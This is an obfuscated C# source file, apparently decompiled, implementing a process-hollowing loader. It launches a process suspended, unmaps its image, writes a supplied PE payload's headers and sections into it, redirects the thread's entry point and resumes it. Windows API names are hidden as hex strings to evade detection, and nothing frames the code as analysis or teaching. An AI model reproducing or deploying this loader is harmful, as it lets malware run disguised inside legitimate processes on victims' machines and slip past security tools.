using System;
using System.IO;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ihnJiSFftJkwOJDnTenHoeEHgqjCYHTfbSohbv;

public sealed class nKFDmsADTQCEjJrRJrPGvAakAlGlrQBotjA : cdwiwaguDrqjUYokeHVkiQDwmNHAPMGvGekbtfI
{
	private struct CxoZapETAJonxAXdhJOYHkEhHjtxFqDouBYstDK
	{
		public uint ContextFlags;

		public uint Dr0;

		public uint Dr1;

		public uint Dr2;

		public uint Dr3;

		public uint Dr6;

		public uint Dr7;

		public FLOATING_SAVE_AREA FloatSave;

		public uint SegGs;

		public uint SegFs;

		public uint SegEs;

		public uint SegDs;

		public uint Edi;

		public uint Esi;

		public uint Ebx;

		public uint Edx;

		public uint Ecx;

		public uint Eax;

		public uint Ebp;

		public uint Eip;

		public uint SegCs;

		public uint EFlags;

		public uint Esp;

		public uint SegSs;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
		public byte[] ExtendedRegisters;
	}

	private delegate bool CreateProcessA(string lpApplicationName, string lpCommandLine, ref JpemmpfEcpRBPSwgArRsUDuECACADulCrPpB XYOlbaKufTGMhVKAtprsUYPEIGwUfUNlOoMJX, ref JpemmpfEcpRBPSwgArRsUDuECACADulCrPpB TvgnkJLiFORDtZOeExGKaVcoPIDTtoJBYcW, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref scuYlNvPASlBpnBIcxDqxpgabOKwLwPjBjrLDj oCoWnIsuYHvkvlQgvsOmhoExaqmRcUxpmbGrTKb, out fevgmKMMernegJsTlqxJVZmwmGfgwRtcdRYo NCIJfEapCVRjaIpvXutJgTjUXmvbPKhvEGGAJ);

	private struct FLOATING_SAVE_AREA
	{
		public uint ControlWord;

		public uint StatusWord;

		public uint TagWord;

		public uint ErrorOffset;

		public uint ErrorSelector;

		public uint DataOffset;

		public uint DataSelector;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
		public byte[] RegisterArea;

		public uint Cr0NpxState;
	}

	private delegate bool GetThreadContext(IntPtr hThread, ref CxoZapETAJonxAXdhJOYHkEhHjtxFqDouBYstDK wjAcATwbRVrejoIWYNMmiRdxTgpPwtdYIQxKic);

	private struct IMAGE_DATA_DIRECTORY
	{
		public uint VirtualAddress;

		public uint Size;
	}

	private struct LwspTZwtwVUAOPvjnddujckeOJksMpkWBGUpqo
	{
		public ushort e_magic;

		public ushort e_cblp;

		public ushort e_cp;

		public ushort e_crlc;

		public ushort e_cparhdr;

		public ushort e_minalloc;

		public ushort e_maxalloc;

		public ushort e_ss;

		public ushort e_sp;

		public ushort e_csum;

		public ushort e_ip;

		public ushort e_cs;

		public ushort e_lfarlc;

		public ushort e_ovno;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
		public ushort[] e_res1;

		public ushort e_oemid;

		public ushort e_oeminfo;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
		public ushort[] e_res2;

		public int e_lfanew;
	}

	private struct IMAGE_FILE_HEADER
	{
		public ushort Machine;

		public ushort NumberOfSections;

		public uint TimeDateStamp;

		public uint PointerToSymbolTable;

		public uint NumberOfSymbols;

		public ushort SizeOfOptionalHeader;

		public ushort Characteristics;
	}

	private struct KlkjTxiWZYlgcNSNtHPmrFLFGArtXdibxZOUAQ
	{
		public uint Signature;

		public IMAGE_FILE_HEADER FileHeader;

		public IMAGE_OPTIONAL_HEADER32 OptionalHeader;
	}

	private struct IMAGE_OPTIONAL_HEADER32
	{
		public ushort Magic;

		public byte MajorLinkerVersion;

		public byte MinorLinkerVersion;

		public uint SizeOfCode;

		public uint SizeOfInitializedData;

		public uint SizeOfUninitializedData;

		public uint AddressOfEntryPoint;

		public uint BaseOfCode;

		public uint BaseOfData;

		public uint ImageBase;

		public uint SectionAlignment;

		public uint FileAlignment;

		public ushort MajorOperatingSystemVersion;

		public ushort MinorOperatingSystemVersion;

		public ushort MajorImageVersion;

		public ushort MinorImageVersion;

		public ushort MajorSubsystemVersion;

		public ushort MinorSubsystemVersion;

		public uint Win32VersionValue;

		public uint SizeOfImage;

		public uint SizeOfHeaders;

		public uint CheckSum;

		public ushort Subsystem;

		public ushort DllCharacteristics;

		public uint SizeOfStackReserve;

		public uint SizeOfStackCommit;

		public uint SizeOfHeapReserve;

		public uint SizeOfHeapCommit;

		public uint LoaderFlags;

		public uint NumberOfRvaAndSizes;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
		public IMAGE_DATA_DIRECTORY[] DataDirectory;
	}

	private struct FwUVfFVJehLumjToFXfdTGnxuoHeDxwKarHl
	{
		public byte Name;

		public Misc Misc;

		public uint VirtualAddress;

		public uint SizeOfRawData;

		public uint PointerToRawData;

		public uint PointerToRelocations;

		public uint PointerToLinenumbers;

		public ushort NumberOfRelocations;

		public ushort NumberOfLinenumbers;

		public uint Characteristics;
	}

	private enum ImageSignatureTypes
	{
		IMAGE_DOS_SIGNATURE = 23117,
		IMAGE_NT_SIGNATURE = 17744,
		IMAGE_OS2_SIGNATURE = 17742,
		IMAGE_OS2_SIGNATURE_LE = 17740,
		IMAGE_VXD_SIGNATURE = 17740
	}

	private struct Misc
	{
		public uint PhysicalAddress;

		public uint VirtualSize;
	}

	private struct fevgmKMMernegJsTlqxJVZmwmGfgwRtcdRYo
	{
		public IntPtr hProcess;

		public IntPtr hThread;

		public int dwProcessId;

		public int dwThreadId;
	}

	private delegate int Re(IntPtr hProcess, int lpBaseAddress, ref IntPtr lpbuffer, int size, ref int kUpJUCegPUMKsxuCBGtZNeHDBgdXXcjXTQGrqg);

	private delegate uint ResumeThread(IntPtr hThread);

	private struct JpemmpfEcpRBPSwgArRsUDuECACADulCrPpB
	{
		public int nLength;

		public IntPtr lpSecurityDescriptor;

		public int bInheritHandle;
	}

	private delegate bool SetThreadContext(IntPtr hThread, ref CxoZapETAJonxAXdhJOYHkEhHjtxFqDouBYstDK wjAcATwbRVrejoIWYNMmiRdxTgpPwtdYIQxKic);

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	private struct scuYlNvPASlBpnBIcxDqxpgabOKwLwPjBjrLDj
	{
		public int cb;

		public string lpReserved;

		public string lpDesktop;

		public string lpTitle;

		public int dwX;

		public int dwY;

		public int dwXSize;

		public int dwYSize;

		public int dwXCountChars;

		public int dwYCountChars;

		public int dwFillAttribute;

		public int dwFlags;

		public short wShowWindow;

		public short cbReserved2;

		public int lpReserved2;

		public int hStdInput;

		public int hStdOutput;

		public int hStdError;
	}

	private delegate IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

	private delegate int VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, UIntPtr flNewProtect, [Out] uint lpflOldProtect);

	private delegate bool Wr(IntPtr hProcess, IntPtr lpBaseAddress, byte[] ICtdwlIBlQYTnnIiNroHWXNVNOkTpWvqKEMZ, int iSize, out int lpNumberOfBytesWritten);

	private delegate long ZwUnmapViewOfSection(IntPtr hProcess, IntPtr BaseAddress);

	private const int CONTEXT_X86 = 65536;

	private const int CONTEXT86_INTEGER = 65538;

	private const string KERNEL32HEX = "0x6b65726e656c3332";

	private const long MEM_COMMIT = 4096L;

	private const long MEM_RESERVE = 8192L;

	private const string NTDLLHEX = "0x6e74646c6c";

	private const long PAGE_EXECUTE = 16L;

	private const long PAGE_EXECUTE_READ = 32L;

	private const long PAGE_EXECUTE_READWRITE = 64L;

	private const long PAGE_NOACCESS = 1L;

	private const uint PAGE_READONLY = 2u;

	private const long PAGE_READWRITE = 4L;

	private long bedot(long characteristics)
	{
		object[] array = new object[8] { 1L, 16L, 2, 32L, 4L, 64L, 4L, 64L };
		return Conversions.ToLong(array[(int)RShift(characteristics, 29L)]);
	}

	public bool DsguHgEpvvODDoShmLGqXkjkcwgBPIvbsNsxgtN(byte[] JCHWUWWiJIVmEvYQdNFlOIueOPLGRVnbCYmO, string SqZWmShVGiBmjUkKeHwGbICIQOjTpheGHJL)
	{
		long num = 0L;
		uint num2 = 0u;
		IntPtr zero = IntPtr.Zero;
		LwspTZwtwVUAOPvjnddujckeOJksMpkWBGUpqo lwspTZwtwVUAOPvjnddujckeOJksMpkWBGUpqo = default(LwspTZwtwVUAOPvjnddujckeOJksMpkWBGUpqo);
		CxoZapETAJonxAXdhJOYHkEhHjtxFqDouBYstDK wjAcATwbRVrejoIWYNMmiRdxTgpPwtdYIQxKic = default(CxoZapETAJonxAXdhJOYHkEhHjtxFqDouBYstDK);
		KlkjTxiWZYlgcNSNtHPmrFLFGArtXdibxZOUAQ klkjTxiWZYlgcNSNtHPmrFLFGArtXdibxZOUAQ = default(KlkjTxiWZYlgcNSNtHPmrFLFGArtXdibxZOUAQ);
		FwUVfFVJehLumjToFXfdTGnxuoHeDxwKarHl fwUVfFVJehLumjToFXfdTGnxuoHeDxwKarHl = default(FwUVfFVJehLumjToFXfdTGnxuoHeDxwKarHl);
		fevgmKMMernegJsTlqxJVZmwmGfgwRtcdRYo NCIJfEapCVRjaIpvXutJgTjUXmvbPKhvEGGAJ = default(fevgmKMMernegJsTlqxJVZmwmGfgwRtcdRYo);
		scuYlNvPASlBpnBIcxDqxpgabOKwLwPjBjrLDj oCoWnIsuYHvkvlQgvsOmhoExaqmRcUxpmbGrTKb = default(scuYlNvPASlBpnBIcxDqxpgabOKwLwPjBjrLDj);
		JpemmpfEcpRBPSwgArRsUDuECACADulCrPpB XYOlbaKufTGMhVKAtprsUYPEIGwUfUNlOoMJX = default(JpemmpfEcpRBPSwgArRsUDuECACADulCrPpB);
		JpemmpfEcpRBPSwgArRsUDuECACADulCrPpB TvgnkJLiFORDtZOeExGKaVcoPIDTtoJBYcW = default(JpemmpfEcpRBPSwgArRsUDuECACADulCrPpB);
		GCHandle gCHandle = GCHandle.Alloc(JCHWUWWiJIVmEvYQdNFlOIueOPLGRVnbCYmO, GCHandleType.Pinned);
		int num3 = gCHandle.AddrOfPinnedObject().ToInt32();
		lwspTZwtwVUAOPvjnddujckeOJksMpkWBGUpqo = (LwspTZwtwVUAOPvjnddujckeOJksMpkWBGUpqo)Marshal.PtrToStructure(gCHandle.AddrOfPinnedObject(), lwspTZwtwVUAOPvjnddujckeOJksMpkWBGUpqo.GetType());
		gCHandle.Free();
		CreateProcessA createProcessA = (CreateProcessA)VhKTasFEIJkNvYxJAvfurUhwxrFUfShFEAYFIAE("0x6b65726e656c3332", "0x43726561746550726f6365737341", typeof(CreateProcessA));
		if (!createProcessA(null, SqZWmShVGiBmjUkKeHwGbICIQOjTpheGHJL, ref XYOlbaKufTGMhVKAtprsUYPEIGwUfUNlOoMJX, ref TvgnkJLiFORDtZOeExGKaVcoPIDTtoJBYcW, bInheritHandles: false, 4u, zero, null, ref oCoWnIsuYHvkvlQgvsOmhoExaqmRcUxpmbGrTKb, out NCIJfEapCVRjaIpvXutJgTjUXmvbPKhvEGGAJ))
		{
			return false;
		}
		int value = num3 + lwspTZwtwVUAOPvjnddujckeOJksMpkWBGUpqo.e_lfanew;
		IntPtr ptr = new IntPtr(value);
		klkjTxiWZYlgcNSNtHPmrFLFGArtXdibxZOUAQ = (KlkjTxiWZYlgcNSNtHPmrFLFGArtXdibxZOUAQ)Marshal.PtrToStructure(ptr, klkjTxiWZYlgcNSNtHPmrFLFGArtXdibxZOUAQ.GetType());
		oCoWnIsuYHvkvlQgvsOmhoExaqmRcUxpmbGrTKb.cb = Strings.Len((object)oCoWnIsuYHvkvlQgvsOmhoExaqmRcUxpmbGrTKb);
		wjAcATwbRVrejoIWYNMmiRdxTgpPwtdYIQxKic.ContextFlags = 65538u;
		if (((long)klkjTxiWZYlgcNSNtHPmrFLFGArtXdibxZOUAQ.Signature != 17744L) | (lwspTZwtwVUAOPvjnddujckeOJksMpkWBGUpqo.e_magic != 23117))
		{
			return false;
		}
		GetThreadContext getThreadContext = (GetThreadContext)VhKTasFEIJkNvYxJAvfurUhwxrFUfShFEAYFIAE("0x6b65726e656c3332", "0x476574546872656164436f6e74657874", typeof(GetThreadContext));
		Re re = (Re)VhKTasFEIJkNvYxJAvfurUhwxrFUfShFEAYFIAE("0x6b65726e656c3332", "0x5265616450726f636573734d656d6f7279", typeof(Re));
		ZwUnmapViewOfSection zwUnmapViewOfSection = (ZwUnmapViewOfSection)VhKTasFEIJkNvYxJAvfurUhwxrFUfShFEAYFIAE("0x6e74646c6c", "0x5a77556e6d6170566965774f6653656374696f6e", typeof(ZwUnmapViewOfSection));
		ptr = (IntPtr)num;
		int kUpJUCegPUMKsxuCBGtZNeHDBgdXXcjXTQGrqg = 0;
		num = (long)ptr;
		if (!(getThreadContext(NCIJfEapCVRjaIpvXutJgTjUXmvbPKhvEGGAJ.hThread, ref wjAcATwbRVrejoIWYNMmiRdxTgpPwtdYIQxKic) & (re(NCIJfEapCVRjaIpvXutJgTjUXmvbPKhvEGGAJ.hProcess, (int)((long)wjAcATwbRVrejoIWYNMmiRdxTgpPwtdYIQxKic.Ebx + 8L), ref ptr, 4, ref kUpJUCegPUMKsxuCBGtZNeHDBgdXXcjXTQGrqg) >= 0) & (zwUnmapViewOfSection(NCIJfEapCVRjaIpvXutJgTjUXmvbPKhvEGGAJ.hProcess, (IntPtr)num) >= 0L)))
		{
			return false;
		}
		VirtualAllocEx virtualAllocEx = (VirtualAllocEx)VhKTasFEIJkNvYxJAvfurUhwxrFUfShFEAYFIAE("0x6b65726e656c3332", "0x5669727475616c416c6c6f634578", typeof(VirtualAllocEx));
		uint num4 = (uint)(int)virtualAllocEx(NCIJfEapCVRjaIpvXutJgTjUXmvbPKhvEGGAJ.hProcess, (IntPtr)klkjTxiWZYlgcNSNtHPmrFLFGArtXdibxZOUAQ.OptionalHeader.ImageBase, klkjTxiWZYlgcNSNtHPmrFLFGArtXdibxZOUAQ.OptionalHeader.SizeOfImage, 12288u, 4u);
		if ((long)num4 == 0L)
		{
			return false;
		}
		Wr wr = (Wr)VhKTasFEIJkNvYxJAvfurUhwxrFUfShFEAYFIAE("0x6b65726e656c3332", "0x577269746550726f636573734d656d6f7279", typeof(Wr));
		kUpJUCegPUMKsxuCBGtZNeHDBgdXXcjXTQGrqg = (int)num2;
		wr(NCIJfEapCVRjaIpvXutJgTjUXmvbPKhvEGGAJ.hProcess, (IntPtr)num4, JCHWUWWiJIVmEvYQdNFlOIueOPLGRVnbCYmO, (int)klkjTxiWZYlgcNSNtHPmrFLFGArtXdibxZOUAQ.OptionalHeader.SizeOfHeaders, out kUpJUCegPUMKsxuCBGtZNeHDBgdXXcjXTQGrqg);
		num2 = (uint)kUpJUCegPUMKsxuCBGtZNeHDBgdXXcjXTQGrqg;
		long num5 = lwspTZwtwVUAOPvjnddujckeOJksMpkWBGUpqo.e_lfanew + 248;
		int num6 = klkjTxiWZYlgcNSNtHPmrFLFGArtXdibxZOUAQ.FileHeader.NumberOfSections - 1;
		for (int i = 0; i <= num6; i++)
		{
			ptr = new IntPtr(num3 + num5 + i * 40);
			fwUVfFVJehLumjToFXfdTGnxuoHeDxwKarHl = (FwUVfFVJehLumjToFXfdTGnxuoHeDxwKarHl)Marshal.PtrToStructure(ptr, fwUVfFVJehLumjToFXfdTGnxuoHeDxwKarHl.GetType());
			byte[] array = new byte[fwUVfFVJehLumjToFXfdTGnxuoHeDxwKarHl.SizeOfRawData + 1];
			int num7 = (int)((long)fwUVfFVJehLumjToFXfdTGnxuoHeDxwKarHl.SizeOfRawData - 1L);
			for (int j = 0; j <= num7; j++)
			{
				array[j] = JCHWUWWiJIVmEvYQdNFlOIueOPLGRVnbCYmO[(int)fwUVfFVJehLumjToFXfdTGnxuoHeDxwKarHl.PointerToRawData + j];
			}
			wr = (Wr)VhKTasFEIJkNvYxJAvfurUhwxrFUfShFEAYFIAE("0x6b65726e656c3332", "0x577269746550726f636573734d656d6f7279", typeof(Wr));
			VirtualProtectEx virtualProtectEx = (VirtualProtectEx)VhKTasFEIJkNvYxJAvfurUhwxrFUfShFEAYFIAE("0x6b65726e656c3332", "0x5669727475616c50726f746563744578", typeof(VirtualProtectEx));
			kUpJUCegPUMKsxuCBGtZNeHDBgdXXcjXTQGrqg = (int)num2;
			wr(NCIJfEapCVRjaIpvXutJgTjUXmvbPKhvEGGAJ.hProcess, (IntPtr)(num4 + fwUVfFVJehLumjToFXfdTGnxuoHeDxwKarHl.VirtualAddress), array, (int)fwUVfFVJehLumjToFXfdTGnxuoHeDxwKarHl.SizeOfRawData, out kUpJUCegPUMKsxuCBGtZNeHDBgdXXcjXTQGrqg);
			num2 = (uint)kUpJUCegPUMKsxuCBGtZNeHDBgdXXcjXTQGrqg;
			virtualProtectEx(NCIJfEapCVRjaIpvXutJgTjUXmvbPKhvEGGAJ.hProcess, (IntPtr)(num4 + fwUVfFVJehLumjToFXfdTGnxuoHeDxwKarHl.VirtualAddress), (UIntPtr)fwUVfFVJehLumjToFXfdTGnxuoHeDxwKarHl.Misc.VirtualSize, (UIntPtr)(ulong)bedot(fwUVfFVJehLumjToFXfdTGnxuoHeDxwKarHl.Characteristics), (uint)num);
		}
		byte[] bytes = BitConverter.GetBytes(num4);
		wr = (Wr)VhKTasFEIJkNvYxJAvfurUhwxrFUfShFEAYFIAE("0x6b65726e656c3332", "0x577269746550726f636573734d656d6f7279", typeof(Wr));
		kUpJUCegPUMKsxuCBGtZNeHDBgdXXcjXTQGrqg = (int)num2;
		wr(NCIJfEapCVRjaIpvXutJgTjUXmvbPKhvEGGAJ.hProcess, (IntPtr)((long)wjAcATwbRVrejoIWYNMmiRdxTgpPwtdYIQxKic.Ebx + 8L), bytes, 4, out kUpJUCegPUMKsxuCBGtZNeHDBgdXXcjXTQGrqg);
		num2 = (uint)kUpJUCegPUMKsxuCBGtZNeHDBgdXXcjXTQGrqg;
		wjAcATwbRVrejoIWYNMmiRdxTgpPwtdYIQxKic.Eax = num4 + klkjTxiWZYlgcNSNtHPmrFLFGArtXdibxZOUAQ.OptionalHeader.AddressOfEntryPoint;
		SetThreadContext setThreadContext = (SetThreadContext)VhKTasFEIJkNvYxJAvfurUhwxrFUfShFEAYFIAE("0x6b65726e656c3332", "0x536574546872656164436f6e74657874", typeof(SetThreadContext));
		ResumeThread resumeThread = (ResumeThread)VhKTasFEIJkNvYxJAvfurUhwxrFUfShFEAYFIAE("0x6b65726e656c3332", "0x526573756d65546872656164", typeof(ResumeThread));
		if (!setThreadContext(NCIJfEapCVRjaIpvXutJgTjUXmvbPKhvEGGAJ.hThread, ref wjAcATwbRVrejoIWYNMmiRdxTgpPwtdYIQxKic))
		{
			return false;
		}
		return (long)resumeThread(NCIJfEapCVRjaIpvXutJgTjUXmvbPKhvEGGAJ.hThread) > 0L;
	}

	public bool DsguHgEpvvODDoShmLGqXkjkcwgBPIvbsNsxgtN(string LwspTZwtwVUAOPvjnddujckeOJksMpkWBGUpqo, string CxoZapETAJonxAXdhJOYHkEhHjtxFqDouBYstDK)
	{
		bool result = false;
		if (File.Exists(LwspTZwtwVUAOPvjnddujckeOJksMpkWBGUpqo))
		{
			byte[] jCHWUWWiJIVmEvYQdNFlOIueOPLGRVnbCYmO = File.ReadAllBytes(LwspTZwtwVUAOPvjnddujckeOJksMpkWBGUpqo);
			return DsguHgEpvvODDoShmLGqXkjkcwgBPIvbsNsxgtN(jCHWUWWiJIVmEvYQdNFlOIueOPLGRVnbCYmO, CxoZapETAJonxAXdhJOYHkEhHjtxFqDouBYstDK);
		}
		return result;
	}

	private long RShift(long KlkjTxiWZYlgcNSNtHPmrFLFGArtXdibxZOUAQ, long FwUVfFVJehLumjToFXfdTGnxuoHeDxwKarHl)
	{
		return (long)Math.Round(vbLongToULong(KlkjTxiWZYlgcNSNtHPmrFLFGArtXdibxZOUAQ) / Math.Pow(2.0, FwUVfFVJehLumjToFXfdTGnxuoHeDxwKarHl));
	}

	private double vbLongToULong(long fevgmKMMernegJsTlqxJVZmwmGfgwRtcdRYo)
	{
		if (fevgmKMMernegJsTlqxJVZmwmGfgwRtcdRYo < 0L)
		{
			return fevgmKMMernegJsTlqxJVZmwmGfgwRtcdRYo + 4294967296L;
		}
		return fevgmKMMernegJsTlqxJVZmwmGfgwRtcdRYo;
	}
}
